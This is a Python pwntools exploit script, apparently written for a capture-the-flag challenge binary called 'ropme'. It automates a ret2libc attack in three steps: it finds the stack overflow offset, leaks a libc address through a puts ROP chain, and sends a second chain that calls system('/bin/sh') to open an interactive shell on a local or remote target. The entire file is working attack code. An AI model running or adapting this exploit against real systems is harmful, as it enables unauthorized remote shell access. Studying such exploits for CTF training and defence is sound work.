from pwn import *
import os

HOST = "pwn.digitalocean.com"
PORT = 10002
BINARY = "./ropme"
LIBC = "libc6_2.28-10_amd64.so"
# LIBC = ""


######################################
## Getting padding
######################################
log.info("Getting padding for BOF...")

p = process(BINARY)
p.sendline(cyclic(200, n=8))
p.wait()

core = p.corefile

PADDING = int(str(cyclic_find(core.read(core.rsp, 8), n=8)))

log.info("Padding: " + str(PADDING))

PADDING = 'A' * PADDING
os.system("rm ./core*")

#########################################################
##  Start exploiting
#########################################################
# Execution context
context.update(arch='amd64', os='linux')

local = input("Run local? (y/n): ").strip()

if local == 'y':

    debug = input("Debug? (y/n)").strip()
    if debug == 'y':
        print("GDB will open...")
        p = gdb.debug(BINARY)

    else:
        p = process(BINARY)
    
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so", checksec=False)

else:
    p = remote(HOST, PORT)
    if LIBC != '':
        libc = ELF(LIBC, checksec=False)

elf = ELF(BINARY, checksec=False) # Extract data from binary
rop = ROP(elf) # Find ROP gadgets

#####################
#### Find Gadgets ###
#####################
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"]

MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary ropme | grep "pop rdi"

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))


def get_addr(func_name):
    FUNC_GOT = elf.got[func_name] # maps function name to offset
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))

    # Create rop chain which returns to main
    rop1 = PADDING.encode() + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    #Send our rop-chain payload
    p.sendline(rop1)

    #Parse leaked address
    recieved = p.recvline().strip()
    log.info("Leaks:")
    leak = u64(recieved.ljust(8, b'\x00'))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))

    #If not libc yet, stop here
    if LIBC != '':
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address)) 
    else:
        log.info("Get libc!")
        exit()

    return hex(leak)

print(p.recvuntil(b'password!\n').decode())

get_addr("puts") #Search for puts address in memory to obtains libc base
# get_addr("__libc_start_main")

#################################
### GET SHELL with known LIBC ###
#################################
BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh || finds "/bin/sh" into glibc
SYSTEM = libc.sym["system"] # libc call to system
EXIT = libc.sym["exit"] # libc call to exit

log.info("/bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

print(p.recvuntil(b'password!\n').decode())
#########################
# Stack
#
# POP_RDI gadget offset
# ---------------------
# "/bin/sh"
# ---------------------
# SYSTEM gadget offset
# ---------------------
# EXIT gadget offset
#########################

# system("/bin/sh") // *RDI = "/bin/sh" (first SYSTEM argument)
rop2 = PADDING.encode() + p64(POP_RDI) + p64(BINSH)  + p64(SYSTEM) + p64(EXIT) 

log.info("ROP sent")
p.sendline(rop2)

##### Interact with the shell #####
p.interactive() #Interact with the conenction